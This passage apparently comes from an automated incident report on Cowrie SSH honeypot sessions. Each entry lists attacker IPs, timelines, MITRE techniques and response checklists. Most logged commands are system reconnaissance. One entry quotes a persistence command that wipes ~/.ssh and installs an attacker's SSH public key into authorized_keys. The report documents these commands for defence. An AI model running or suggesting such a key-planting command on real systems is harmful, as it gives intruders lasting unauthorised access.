| `2026-07-01 16:49:38` | `cowrie.client.version` |
| `2026-07-01 16:49:38` | `cowrie.client.kex` |
| `2026-07-01 16:49:40` | `cowrie.login.success` |
| `2026-07-01 16:49:42` | `cowrie.session.params` |
| `2026-07-01 16:49:42` | `cowrie.command.input` |
| `2026-07-01 16:49:42` | `cowrie.command.input` |
| `2026-07-01 16:49:42` | `cowrie.command.input` |
| `2026-07-01 16:49:42` | `cowrie.command.input` |
| `2026-07-01 16:49:42` | `cowrie.command.input` |
| `2026-07-01 16:49:42` | `cowrie.command.success` |
| `2026-07-01 16:49:42` | `cowrie.command.input` |
| `2026-07-01 16:49:42` | `cowrie.command.input` |
| `2026-07-01 16:49:42` | `cowrie.command.input` |
| `2026-07-01 16:49:42` | `cowrie.command.input` |
| `2026-07-01 16:49:43` | `cowrie.log.closed` |
| `2026-07-01 16:49:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b9148663c7f

| Field | Detail |
|---|---|
| **Source IP** | `95.58.255[.]251` |
| **First Seen** | 2026-07-01 16:50 |
| **Last Seen** | 2026-07-01 16:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:50:32` | `cowrie.session.connect` |
| `2026-07-01 16:50:32` | `cowrie.client.version` |
| `2026-07-01 16:50:32` | `cowrie.client.kex` |
| `2026-07-01 16:50:33` | `cowrie.login.success` |
| `2026-07-01 16:50:34` | `cowrie.session.params` |
| `2026-07-01 16:50:34` | `cowrie.command.input` |
| `2026-07-01 16:50:34` | `cowrie.command.failed` |
| `2026-07-01 16:50:34` | `cowrie.log.closed` |
| `2026-07-01 16:50:35` | `cowrie.session.params` |
| `2026-07-01 16:50:35` | `cowrie.command.input` |
| `2026-07-01 16:50:35` | `cowrie.session.file_download` |
| `2026-07-01 16:50:35` | `cowrie.log.closed` |
| `2026-07-01 16:50:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.58.255[.]251` to AbuseIPDB if not already reported
- [ ] Block `95.58.255[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4809a320a77a

| Field | Detail |
|---|---|
| **Source IP** | `95.58.255[.]251` |
| **First Seen** | 2026-07-01 16:50 |
| **Last Seen** | 2026-07-01 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:50:35` | `cowrie.session.connect` |
| `2026-07-01 16:50:35` | `cowrie.client.version` |
| `2026-07-01 16:50:35` | `cowrie.client.kex` |
| `2026-07-01 16:50:36` | `cowrie.login.success` |
| `2026-07-01 16:50:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.58.255[.]251` to AbuseIPDB if not already reported
- [ ] Block `95.58.255[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d64eb643b0c

| Field | Detail |
|---|---|
| **Source IP** | `95.58.255[.]251` |
| **First Seen** | 2026-07-01 16:50 |
| **Last Seen** | 2026-07-01 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:50:37` | `cowrie.session.connect` |
| `2026-07-01 16:50:37` | `cowrie.client.version` |
| `2026-07-01 16:50:37` | `cowrie.client.kex` |
| `2026-07-01 16:50:37` | `cowrie.login.success` |
| `2026-07-01 16:50:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.58.255[.]251` to AbuseIPDB if not already reported
- [ ] Block `95.58.255[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12ced2490947

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 16:51 |
| **Last Seen** | 2026-07-01 16:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:51:33` | `cowrie.session.connect` |
| `2026-07-01 16:51:34` | `cowrie.client.version` |
| `2026-07-01 16:51:34` | `cowrie.client.kex` |
| `2026-07-01 16:51:36` | `cowrie.login.success` |
| `2026-07-01 16:51:38` | `cowrie.session.params` |
| `2026-07-01 16:51:38` | `cowrie.command.input` |
| `2026-07-01 16:51:38` | `cowrie.command.input` |
| `2026-07-01 16:51:38` | `cowrie.command.input` |
| `2026-07-01 16:51:38` | `cowrie.command.input` |
| `2026-07-01 16:51:38` | `cowrie.command.input` |
| `2026-07-01 16:51:38` | `cowrie.command.success` |
| `2026-07-01 16:51:38` | `cowrie.command.input` |
| `2026-07-01 16:51:38` | `cowrie.command.input` |
| `2026-07-01 16:51:38` | `cowrie.command.input` |
| `2026-07-01 16:51:38` | `cowrie.command.input` |
| `2026-07-01 16:51:38` | `cowrie.log.closed` |
| `2026-07-01 16:51:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b1157db5b51

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 16:52 |
| **Last Seen** | 2026-07-01 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:52:19` | `cowrie.session.connect` |
| `2026-07-01 16:52:20` | `cowrie.client.version` |
| `2026-07-01 16:52:20` | `cowrie.client.kex` |
| `2026-07-01 16:52:20` | `cowrie.login.success` |
| `2026-07-01 16:52:21` | `cowrie.session.params` |
| `2026-07-01 16:52:21` | `cowrie.command.input` |
| `2026-07-01 16:52:21` | `cowrie.command.input` |
| `2026-07-01 16:52:21` | `cowrie.command.input` |
| `2026-07-01 16:52:21` | `cowrie.command.input` |
| `2026-07-01 16:52:21` | `cowrie.command.input` |
| `2026-07-01 16:52:21` | `cowrie.command.success` |
| `2026-07-01 16:52:21` | `cowrie.command.input` |
| `2026-07-01 16:52:21` | `cowrie.command.input` |
| `2026-07-01 16:52:21` | `cowrie.command.input` |
| `2026-07-01 16:52:21` | `cowrie.command.input` |
| `2026-07-01 16:52:21` | `cowrie.log.closed` |
| `2026-07-01 16:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-889a5ca9734e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 16:53 |
| **Last Seen** | 2026-07-01 16:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:53:28` | `cowrie.session.connect` |
| `2026-07-01 16:53:29` | `cowrie.client.version` |
| `2026-07-01 16:53:29` | `cowrie.client.kex` |
| `2026-07-01 16:53:31` | `cowrie.login.success` |
| `2026-07-01 16:53:33` | `cowrie.session.params` |
| `2026-07-01 16:53:33` | `cowrie.command.input` |
| `2026-07-01 16:53:33` | `cowrie.command.input` |
| `2026-07-01 16:53:33` | `cowrie.command.input` |
| `2026-07-01 16:53:33` | `cowrie.command.input` |
| `2026-07-01 16:53:33` | `cowrie.command.input` |
| `2026-07-01 16:53:33` | `cowrie.command.success` |
| `2026-07-01 16:53:33` | `cowrie.command.input` |
| `2026-07-01 16:53:33` | `cowrie.command.input` |
| `2026-07-01 16:53:33` | `cowrie.command.input` |
| `2026-07-01 16:53:33` | `cowrie.command.input` |
| `2026-07-01 16:53:33` | `cowrie.log.closed` |
| `2026-07-01 16:53:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f105a99a5c8a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 16:55 |
| **Last Seen** | 2026-07-01 16:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:55:25` | `cowrie.session.connect` |
| `2026-07-01 16:55:25` | `cowrie.client.version` |
| `2026-07-01 16:55:25` | `cowrie.client.kex` |
| `2026-07-01 16:55:28` | `cowrie.login.success` |
| `2026-07-01 16:55:29` | `cowrie.session.params` |
| `2026-07-01 16:55:29` | `cowrie.command.input` |
| `2026-07-01 16:55:29` | `cowrie.command.input` |
| `2026-07-01 16:55:29` | `cowrie.command.input` |
| `2026-07-01 16:55:29` | `cowrie.command.input` |
| `2026-07-01 16:55:29` | `cowrie.command.input` |
| `2026-07-01 16:55:29` | `cowrie.command.success` |
| `2026-07-01 16:55:29` | `cowrie.command.input` |
| `2026-07-01 16:55:29` | `cowrie.command.input` |
| `2026-07-01 16:55:29` | `cowrie.command.input` |
| `2026-07-01 16:55:29` | `cowrie.command.input` |
| `2026-07-01 16:55:30` | `cowrie.log.closed` |
| `2026-07-01 16:55:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33721451f6cb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 16:56 |
| **Last Seen** | 2026-07-01 16:56 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:56:04` | `cowrie.session.connect` |
| `2026-07-01 16:56:05` | `cowrie.client.version` |
| `2026-07-01 16:56:05` | `cowrie.client.kex` |
| `2026-07-01 16:56:11` | `cowrie.login.success` |
| `2026-07-01 16:56:15` | `cowrie.session.params` |
| `2026-07-01 16:56:15` | `cowrie.command.input` |
| `2026-07-01 16:56:16` | `cowrie.log.closed` |
| `2026-07-01 16:56:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9888fe51c6d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 16:57 |
| **Last Seen** | 2026-07-01 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:57:20` | `cowrie.session.connect` |
| `2026-07-01 16:57:20` | `cowrie.client.version` |
| `2026-07-01 16:57:20` | `cowrie.client.kex` |
| `2026-07-01 16:57:21` | `cowrie.login.success` |
| `2026-07-01 16:57:21` | `cowrie.session.params` |
| `2026-07-01 16:57:21` | `cowrie.command.input` |
| `2026-07-01 16:57:21` | `cowrie.command.input` |
| `2026-07-01 16:57:21` | `cowrie.command.input` |
| `2026-07-01 16:57:21` | `cowrie.command.input` |
| `2026-07-01 16:57:21` | `cowrie.command.input` |
| `2026-07-01 16:57:21` | `cowrie.command.success` |
| `2026-07-01 16:57:21` | `cowrie.command.input` |
| `2026-07-01 16:57:21` | `cowrie.command.input` |
| `2026-07-01 16:57:21` | `cowrie.command.input` |
| `2026-07-01 16:57:21` | `cowrie.command.input` |
| `2026-07-01 16:57:21` | `cowrie.log.closed` |
| `2026-07-01 16:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02e4b46665eb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 16:57 |
| **Last Seen** | 2026-07-01 16:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:57:23` | `cowrie.session.connect` |
| `2026-07-01 16:57:24` | `cowrie.client.version` |
| `2026-07-01 16:57:24` | `cowrie.client.kex` |
| `2026-07-01 16:57:26` | `cowrie.login.success` |
| `2026-07-01 16:57:28` | `cowrie.session.params` |
| `2026-07-01 16:57:28` | `cowrie.command.input` |
| `2026-07-01 16:57:28` | `cowrie.command.input` |
| `2026-07-01 16:57:28` | `cowrie.command.input` |
| `2026-07-01 16:57:28` | `cowrie.command.input` |
| `2026-07-01 16:57:28` | `cowrie.command.input` |
| `2026-07-01 16:57:28` | `cowrie.command.success` |
| `2026-07-01 16:57:28` | `cowrie.command.input` |
| `2026-07-01 16:57:28` | `cowrie.command.input` |
| `2026-07-01 16:57:28` | `cowrie.command.input` |
| `2026-07-01 16:57:28` | `cowrie.command.input` |
| `2026-07-01 16:57:28` | `cowrie.log.closed` |
| `2026-07-01 16:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30dfb2ea293c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 16:59 |
| **Last Seen** | 2026-07-01 16:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:59:19` | `cowrie.session.connect` |
| `2026-07-01 16:59:20` | `cowrie.client.version` |
| `2026-07-01 16:59:20` | `cowrie.client.kex` |
| `2026-07-01 16:59:21` | `cowrie.login.success` |
| `2026-07-01 16:59:22` | `cowrie.session.params` |
| `2026-07-01 16:59:22` | `cowrie.command.input` |
| `2026-07-01 16:59:22` | `cowrie.command.input` |
| `2026-07-01 16:59:22` | `cowrie.command.input` |
| `2026-07-01 16:59:22` | `cowrie.command.input` |
| `2026-07-01 16:59:22` | `cowrie.command.input` |
| `2026-07-01 16:59:22` | `cowrie.command.success` |
| `2026-07-01 16:59:22` | `cowrie.command.input` |
| `2026-07-01 16:59:22` | `cowrie.command.input` |
| `2026-07-01 16:59:22` | `cowrie.command.input` |
| `2026-07-01 16:59:22` | `cowrie.command.input` |
| `2026-07-01 16:59:23` | `cowrie.log.closed` |
| `2026-07-01 16:59:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bba1dbb8d17

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 17:01 |
| **Last Seen** | 2026-07-01 17:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:01:57` | `cowrie.session.connect` |
| `2026-07-01 17:01:57` | `cowrie.client.version` |
| `2026-07-01 17:01:57` | `cowrie.client.kex` |
| `2026-07-01 17:02:00` | `cowrie.login.success` |
| `2026-07-01 17:02:01` | `cowrie.session.params` |
| `2026-07-01 17:02:01` | `cowrie.command.input` |
| `2026-07-01 17:02:02` | `cowrie.log.closed` |
| `2026-07-01 17:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6048163cfd04

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 17:02 |
| **Last Seen** | 2026-07-01 17:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:02:37` | `cowrie.session.connect` |
| `2026-07-01 17:02:37` | `cowrie.client.version` |
| `2026-07-01 17:02:37` | `cowrie.client.kex` |
| `2026-07-01 17:02:38` | `cowrie.login.success` |
| `2026-07-01 17:02:39` | `cowrie.session.params` |
| `2026-07-01 17:02:39` | `cowrie.command.input` |
| `2026-07-01 17:02:39` | `cowrie.command.input` |
| `2026-07-01 17:02:39` | `cowrie.command.input` |
| `2026-07-01 17:02:39` | `cowrie.command.input` |
| `2026-07-01 17:02:39` | `cowrie.command.input` |
| `2026-07-01 17:02:39` | `cowrie.command.success` |
| `2026-07-01 17:02:39` | `cowrie.command.input` |
| `2026-07-01 17:02:39` | `cowrie.command.input` |
| `2026-07-01 17:02:39` | `cowrie.command.input` |
| `2026-07-01 17:02:39` | `cowrie.command.input` |
| `2026-07-01 17:02:39` | `cowrie.log.closed` |
| `2026-07-01 17:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb8fc8cd16aa

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 17:03 |
| **Last Seen** | 2026-07-01 17:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:03:25` | `cowrie.session.connect` |
| `2026-07-01 17:03:25` | `cowrie.client.version` |
| `2026-07-01 17:03:25` | `cowrie.client.kex` |
| `2026-07-01 17:03:26` | `cowrie.login.success` |
| `2026-07-01 17:03:27` | `cowrie.session.params` |
| `2026-07-01 17:03:27` | `cowrie.command.input` |
| `2026-07-01 17:03:27` | `cowrie.command.input` |
| `2026-07-01 17:03:27` | `cowrie.command.input` |
| `2026-07-01 17:03:27` | `cowrie.command.input` |
| `2026-07-01 17:03:27` | `cowrie.command.input` |
| `2026-07-01 17:03:27` | `cowrie.command.success` |
| `2026-07-01 17:03:27` | `cowrie.command.input` |
| `2026-07-01 17:03:27` | `cowrie.command.input` |
| `2026-07-01 17:03:27` | `cowrie.command.input` |
| `2026-07-01 17:03:27` | `cowrie.command.input` |
| `2026-07-01 17:03:28` | `cowrie.log.closed` |
| `2026-07-01 17:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-023d861f8642

